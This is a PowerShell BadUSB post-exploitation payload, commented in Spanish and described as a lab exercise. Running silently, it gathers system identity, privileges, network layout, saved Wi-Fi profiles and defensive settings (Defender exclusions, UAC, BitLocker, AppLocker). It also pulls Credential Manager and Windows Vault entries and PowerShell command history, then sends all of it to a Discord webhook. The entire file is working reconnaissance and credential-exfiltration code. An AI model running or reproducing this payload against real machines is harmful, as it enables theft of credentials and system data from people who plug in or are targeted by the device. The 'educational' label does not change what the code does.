# ============================================================
# BadUSB Recon Lab - Payload de reconocimiento post-explotación
# Entorno: Windows 10/11, PowerShell 5.1
# Uso: educativo / laboratorio propio
# ============================================================

$ErrorActionPreference = "SilentlyContinue"

# --- Configuración ---
$Webhook = $env:DISCORD_WEBHOOK
if (-not $Webhook) {
    Write-Host "[-] Falta la variable de entorno DISCORD_WEBHOOK" -ForegroundColor Red
    exit 1
}
$MaxLen  = 1900   # margen bajo el límite de 2000 de Discord

# --- Función para enviar a Discord troceando si hace falta ---
function Send-Discord {
    param([string]$Title, [string]$Body)

    $text = "**$Title**`n``````$Body``````"
    $chunks = @()
    while ($text.Length -gt $MaxLen) {
        $chunks += $text.Substring(0, $MaxLen)
        $text    = $text.Substring($MaxLen)
    }
    if ($text.Length -gt 0) { $chunks += $text }

    foreach ($c in $chunks) {
        $json  = ConvertTo-Json @{ content = $c } -Compress
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        try {
            Invoke-RestMethod -Uri $Webhook -Method Post -Body $bytes `
                -ContentType "application/json; charset=utf-8" | Out-Null
        } catch { }
        Start-Sleep -Milliseconds 700   # rate limit de Discord
    }
}

# ============================================================
# BLOQUE 1: Identidad y sistema
# ============================================================
$u      = whoami
$h      = hostname
$dom    = $env:USERDOMAIN
$so     = (Get-CimInstance Win32_OperatingSystem).Caption
$build  = (Get-CimInstance Win32_OperatingSystem).BuildNumber
$arch   = $env:PROCESSOR_ARCHITECTURE
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$grupos = (whoami /groups | Out-String).Trim()
$privs  = (whoami /priv   | Out-String).Trim()
$admins = (net localgroup administrators | Out-String).Trim()
$users  = (net user | Out-String).Trim()

$bloque1 = @"
Usuario:  $u
Dominio:  $dom
Host:     $h
SO:       $so (build $build, $arch)
Boot:     $uptime

--- GRUPOS ---
$grupos

--- PRIVILEGIOS ---
$privs

--- ADMINS LOCALES ---
$admins

--- USUARIOS LOCALES ---
$users
"@
Send-Discord -Title "🖥️ BLOQUE 1 — Identidad y sistema" -Body $bloque1

# ============================================================
# BLOQUE 2: Red
# ============================================================
$ip      = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike '*Loopback*').IPAddress -join ', ')
$rutas   = (route print | Out-String).Trim()
$arp     = (arp -a | Out-String).Trim()
$dns     = (Get-DnsClientServerAddress -AddressFamily IPv4 | Out-String).Trim()
$netstat = (netstat -ano | Select-String "ESTABLISHED" | Select -First 40 | Out-String).Trim()
$wifi    = (netsh wlan show profiles | Out-String).Trim()
$fw      = (netsh advfirewall show allprofiles state | Out-String).Trim()
$shares  = (net view | Out-String).Trim()

$bloque2 = @"
IPs:        $ip
DNS:        $dns

--- FIREWALL ---
$fw

--- RUTAS ---
$rutas

--- ARP ---
$arp

--- CONEXIONES ESTABLECIDAS ---
$netstat

--- WIFI GUARDADAS ---
$wifi

--- SHARES VISIBLES ---
$shares
"@
Send-Discord -Title "🌐 BLOQUE 2 — Red" -Body $bloque2

# ============================================================
# BLOQUE 3: Defensas
# ============================================================
$av     = (Get-MpComputerStatus | Select AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled, AntivirusSignatureLastUpdated, AMEngineVersion | Out-String).Trim()
$excl   = (Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension | Out-String).Trim()
$uac    = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select EnableLUA, ConsentPromptBehaviorAdmin | Out-String).Trim()
$bitl   = (Get-BitLockerVolume | Select MountPoint, VolumeStatus, ProtectionStatus | Out-String).Trim()
$appl   = (Get-AppLockerPolicy -Effective | Out-String).Trim()

$bloque3 = @"
--- DEFENDER ---
$av

--- EXCLUSIONES ---
$excl

--- UAC ---
$uac

--- BITLOCKER ---
$bitl

--- APPLOCKER ---
$appl
"@
Send-Discord -Title "🛡️ BLOQUE 3 — Defensas" -Body $bloque3

# ============================================================
# BLOQUE 4: Procesos, servicios y software
# ============================================================
$proc   = (Get-Process | Sort -Property WS -Descending | Select -First 25 Name, Id, WS | Out-String).Trim()
$serv   = (Get-Service | Where-Object Status -eq "Running" | Select -First 50 Name, DisplayName | Out-String).Trim()
$soft   = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
            Select DisplayName, DisplayVersion, Publisher |
            Where-Object DisplayName | Out-String).Trim()
$tasks  = (schtasks /query /fo LIST /v | Select-String "TaskName|Run As User|Task To Run" | Select -First 60 | Out-String).Trim()

$bloque4 = @"
--- TOP PROCESOS ---
$proc

--- SERVICIOS ACTIVOS ---
$serv

--- SOFTWARE INSTALADO ---
$soft

--- TAREAS PROGRAMADAS ---
$tasks
"@
Send-Discord -Title "⚙️ BLOQUE 4 — Procesos / Software" -Body $bloque4

# ============================================================
# BLOQUE 5: Credenciales y secretos
# ============================================================
$cred   = (cmdkey /list | Out-String).Trim()
$vault  = (vaultcmd /listcreds:"Windows Credentials" /all | Out-String).Trim()
$pshist = if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
              Get-Content (Get-PSReadlineOption).HistorySavePath | Select -Last 30 | Out-String
          } else { "sin historial PSReadline" }

$bloque5 = @"
--- CREDENTIAL MANAGER ---
$cred

--- WINDOWS VAULT ---
$vault

--- ULTIMOS COMANDOS PS ---
$pshist
"@
Send-Discord -Title "🔑 BLOQUE 5 — Credenciales y secretos" -Body $bloque5

# ============================================================
# BLOQUE 6: Persistencia y defensas (mitigaciones del proyecto)
# ============================================================
$persist = @"
--- COMANDOS EJECUTADOS POR ESTE SCRIPT ---
HostName: $env:COMPUTERNAME
Usuario:  $env:USERNAME
PID PS:   $PID
Ruta PS:  $PSHOME
Hora:     $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

Estos datos son parte del experimento de IOCs del proyecto.
Revisar Event Log y Sysmon para ver las huellas generadas.
"@
Send-Discord -Title "📋 BLOQUE 6 — Resumen de ejecución" -Body $persist

Write-Host "[+] Recon completado. Revisa tu canal de Discord."